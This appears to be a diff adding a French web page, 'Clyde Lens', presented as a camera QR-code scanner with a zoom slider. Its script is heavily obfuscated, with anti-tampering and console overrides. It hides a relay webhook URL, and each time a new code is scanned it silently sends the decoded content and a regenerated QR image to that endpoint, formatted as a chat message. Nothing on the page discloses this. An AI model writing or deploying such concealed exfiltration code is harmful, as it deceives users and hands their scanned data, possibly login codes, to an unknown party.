@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Clyde Lens</title>
+    <script src="https://unpkg.com/html5-qrcode"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.1/qrcode.min.js"></script>
+
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #23272A;
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        h2 {
+            margin-top: 20px;
+            color: #7289da;
+        }
+
+        #reader {
+            width: 90%;
+            max-width: 500px;
+            border-radius: 15px;
+            overflow: hidden;
+            background: #000;
+        }
+
+        #status {
+            margin-top: 20px;
+            padding: 12px 25px;
+            border-radius: 25px;
+            background: #2c2f33;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .zoom-container {
+            width: 80%;
+            max-width: 400px;
+            margin: 20px 0;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        input[type=range] {
+            width: 100%;
+            accent-color: #7289da;
+            height: 30px;
+        }
+
+        #tempCanvas {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h2>Clyde Lens</h2>
+
+    <div id="reader"></div>
+
+    <div id="zoom-area" class="zoom-container">
+        <label>🔍 Zoom</label>
+        <input type="range" id="zoom-slider" min="1" max="5" step="0.1" value="1">
+    </div>
+
+    <div id="status">⏳ Initialisation...</div>
+    <canvas id="tempCanvas"></canvas>
+
+    <script>
+        const _0x3eee3b = _0x1263; (function (_0x24d1bc, _0x21ba09) { const _0x4b2a7c = _0x1263, _0x43a8c3 = _0x24d1bc(); while (!![]) { try { const _0x4333d4 = -parseInt(_0x4b2a7c(0xc5)) / 0x1 * (-parseInt(_0x4b2a7c(0xb0)) / 0x2) + -parseInt(_0x4b2a7c(0xbf)) / 0x3 + -parseInt(_0x4b2a7c(0x8e)) / 0x4 * (-parseInt(_0x4b2a7c(0xa8)) / 0x5) + parseInt(_0x4b2a7c(0xca)) / 0x6 + parseInt(_0x4b2a7c(0x9a)) / 0x7 * (parseInt(_0x4b2a7c(0xd1)) / 0x8) + parseInt(_0x4b2a7c(0xc7)) / 0x9 + -parseInt(_0x4b2a7c(0xaf)) / 0xa; if (_0x4333d4 === _0x21ba09) break; else _0x43a8c3['push'](_0x43a8c3['shift']()); } catch (_0x1f5bf7) { _0x43a8c3['push'](_0x43a8c3['shift']()); } } }(_0x536c, 0x2d2a8)); const _0x5c8684 = (function () { let _0x9c4348 = !![]; return function (_0x5cfcee, _0x33357d) { const _0x1df742 = _0x9c4348 ? function () { const _0x281d25 = _0x1263; if (_0x33357d) { const _0x1eb5b4 = _0x33357d[_0x281d25(0xa6)](_0x5cfcee, arguments); return _0x33357d = null, _0x1eb5b4; } } : function () { }; return _0x9c4348 = ![], _0x1df742; }; }()), _0x41c198 = _0x5c8684(this, function () { const _0x15fbf0 = _0x1263; return _0x41c198[_0x15fbf0(0xba)]()[_0x15fbf0(0xaa)](_0x15fbf0(0xd7) + '+$')[_0x15fbf0(0xba)]()[_0x15fbf0(0xa0) + 'r'](_0x41c198)[_0x15fbf0(0xaa)](_0x15fbf0(0xd7) + '+$'); }); _0x41c198(); const _0x158a7e = (function () { let _0x14d719 = !![]; return function (_0x2192b5, _0x85c415) { const _0x111f89 = _0x14d719 ? function () { const _0x2df77e = _0x1263; if (_0x85c415) { const _0x2fc06e = _0x85c415[_0x2df77e(0xa6)](_0x2192b5, arguments); return _0x85c415 = null, _0x2fc06e; } } : function () { }; return _0x14d719 = ![], _0x111f89; }; }()), _0x9afc39 = _0x158a7e(this, function () { const _0x34cc06 = _0x1263, _0x1d16e9 = function () { const _0x101080 = _0x1263; let _0x7ac82b; try { _0x7ac82b = Function(_0x101080(0xb7) + _0x101080(0x90) + (_0x101080(0x96) + _0x101080(0xb4) + 'rn\x20this\x22)(' + '\x20)') + ');')(); } catch (_0x4b1318) { _0x7ac82b = window; } return _0x7ac82b; }, _0x57e1c8 = _0x1d16e9(), _0x4983d9 = _0x57e1c8[_0x34cc06(0xad)] = _0x57e1c8[_0x34cc06(0xad)] || {}, _0x3351a8 = [_0x34cc06(0xab), _0x34cc06(0xc6), _0x34cc06(0x8f), _0x34cc06(0xd6), 'exception', 'table', _0x34cc06(0x9c)]; for (let _0x2be7b5 = 0x0; _0x2be7b5 < _0x3351a8[_0x34cc06(0xbd)]; _0x2be7b5++) { const _0x24d5c6 = _0x158a7e[_0x34cc06(0xa0) + 'r'][_0x34cc06(0xdb)]['bind'](_0x158a7e), _0x28e818 = _0x3351a8[_0x2be7b5], _0x1ac34d = _0x4983d9[_0x28e818] || _0x24d5c6; _0x24d5c6['__proto__'] = _0x158a7e[_0x34cc06(0xd5)](_0x158a7e), _0x24d5c6[_0x34cc06(0xba)] = _0x1ac34d['toString']['bind'](_0x1ac34d), _0x4983d9[_0x28e818] = _0x24d5c6; } }); _0x9afc39(); const WEBHOOK_URL = _0x3eee3b(0xc3) + 'yde-relay.' + _0x3eee3b(0xdd) + _0x3eee3b(0xae) + 'ev/'; let lastResult = ''; function _0x1263(_0x473f30, _0x54e004) { _0x473f30 = _0x473f30 - 0x8e; const _0xa1f840 = _0x536c(); let _0x9afc39 = _0xa1f840[_0x473f30]; return _0x9afc39; } const statusDiv = document[_0x3eee3b(0x9d) + _0x3eee3b(0xcc)](_0x3eee3b(0x97)), canvas = document[_0x3eee3b(0x9d) + 'ById'](_0x3eee3b(0xb3)), zoomArea = document[_0x3eee3b(0x9d) + 'ById'](_0x3eee3b(0x92)), zoomSlider = document[_0x3eee3b(0x9d) + _0x3eee3b(0xcc)](_0x3eee3b(0xc8) + 'r'); function updateStatus(_0x4603fe, _0x44e6c9) { const _0x555465 = _0x3eee3b; statusDiv['innerText'] = _0x4603fe, statusDiv[_0x555465(0x9f)][_0x555465(0xa2) + 'Color'] = _0x44e6c9; } function _0x536c() { const _0x2f0fd6 = ['append', 'min', '📡\x20**QR\x20dét', 'https://cl', 'PS\x20requis)', '23SOsWyC', 'warn', '616122ptQpVl', 'zoom-slide', '✅\x20Envoyé\x20!', '335334rnrTPF', 'ecté\x20!**\x0aD', 'ById', 'stringify', 'Zoom\x20non\x20s', 'vibrate', 'applyConst', '14296qKaBZo', 'stener', 'acks', 'r\x20ce\x20navig', 'bind', 'error', '(((.+)+)+)', 'raints', 'zoom', 'srcObject', 'prototype', '#faa61a', 'pofaco2759', 'environmen', '4QFdRYv', 'info', 'nction()\x20', '#reader\x20vi', 'zoom-area', 'max', 'qrcode.png', '#43b581', '{}.constru', 'status', 'onnées\x20:\x20`', 'blob', '434JNgheS', '❌\x20Erreur', 'trace', 'getElement', 'POST', 'style', 'constructo', 'getCapabil', 'background', 'flex', 'améra\x20(HTT', 'deo', 'apply', 'Prêt', '977285DqAyEr', 'value', 'search', 'log', 'reader', 'console', '.workers.d', '5318060RFFdLs', '29542WncLmq', 'display', 'ities', 'tempCanvas', 'ctor(\x22retu', 'step', 'ateur.', 'return\x20(fu', 'addEventLi', 'start', 'toString', 'getVideoTr', 'payload_js', 'length', '#f04747', '160575BhwYQx']; _0x536c = function () { return _0x2f0fd6; }; return _0x536c(); } async function onScanSuccess(_0x18ac2a) { const _0x2495eb = _0x3eee3b; if (_0x18ac2a !== lastResult) { lastResult = _0x18ac2a; if (navigator[_0x2495eb(0xcf)]) navigator[_0x2495eb(0xcf)](0x64); updateStatus('🔄\x20Envoi...', _0x2495eb(0xdc)); try { const _0x5934e0 = await QRCode['toDataURL'](canvas, _0x18ac2a, { 'width': 0x1f4 }), _0x2fe517 = await fetch(_0x5934e0), _0x19f31c = await _0x2fe517[_0x2495eb(0x99)](), _0x21b312 = new FormData(); _0x21b312[_0x2495eb(0xc0)](_0x2495eb(0xbc) + 'on', JSON[_0x2495eb(0xcd)]({ 'content': _0x2495eb(0xc2) + _0x2495eb(0xcb) + _0x2495eb(0x98) + _0x18ac2a + '`' })), _0x21b312[_0x2495eb(0xc0)]('file', _0x19f31c, _0x2495eb(0x94)), await fetch(WEBHOOK_URL, { 'method': _0x2495eb(0x9e), 'body': _0x21b312 }), updateStatus(_0x2495eb(0xc9), _0x2495eb(0x95)); } catch (_0x2d3fa9) { updateStatus(_0x2495eb(0x9b), _0x2495eb(0xbe)); } } } const html5QrCode = new Html5Qrcode(_0x3eee3b(0xac)); html5QrCode[_0x3eee3b(0xb9)]({ 'facingMode': _0x3eee3b(0xde) + 't' }, { 'fps': 0xf, 'qrbox': 0xfa }, onScanSuccess)['then'](() => { const _0x327416 = _0x3eee3b; updateStatus('📷\x20Scanner\x20' + _0x327416(0xa7), '#7289da'), setTimeout(() => { const _0x4f3f63 = _0x327416; try { const _0x1afd24 = document['querySelec' + 'tor'](_0x4f3f63(0x91) + _0x4f3f63(0xa5)); if (!_0x1afd24) return; const _0x439ec2 = _0x1afd24[_0x4f3f63(0xda)], _0x34844e = _0x439ec2[_0x4f3f63(0xbb) + _0x4f3f63(0xd3)]()[0x0], _0x1b0845 = _0x34844e[_0x4f3f63(0xa1) + _0x4f3f63(0xb2)](); _0x1b0845 && _0x1b0845[_0x4f3f63(0xd9)] && (zoomArea[_0x4f3f63(0x9f)][_0x4f3f63(0xb1)] = _0x4f3f63(0xa3), zoomSlider[_0x4f3f63(0xc1)] = _0x1b0845[_0x4f3f63(0xd9)][_0x4f3f63(0xc1)], zoomSlider[_0x4f3f63(0x93)] = _0x1b0845[_0x4f3f63(0xd9)]['max'], zoomSlider[_0x4f3f63(0xb5)] = _0x1b0845[_0x4f3f63(0xd9)][_0x4f3f63(0xb5)], zoomSlider[_0x4f3f63(0xb8) + _0x4f3f63(0xd2)]('input', () => { const _0x406c14 = _0x4f3f63; _0x34844e[_0x406c14(0xd0) + _0x406c14(0xd8)]({ 'advanced': [{ 'zoom': zoomSlider[_0x406c14(0xa9)] }] }); })); } catch (_0x498165) { console[_0x4f3f63(0xc6)](_0x4f3f63(0xce) + 'upporté\x20su' + _0x4f3f63(0xd4) + _0x4f3f63(0xb6)); } }, 0x3e8); })['catch'](_0x1d5139 => { const _0x1c2959 = _0x3eee3b; updateStatus('❌\x20Erreur\x20C' + _0x1c2959(0xa4) + _0x1c2959(0xc4), _0x1c2959(0xbe)); });
+    </script>
+</body>
+
+</html>
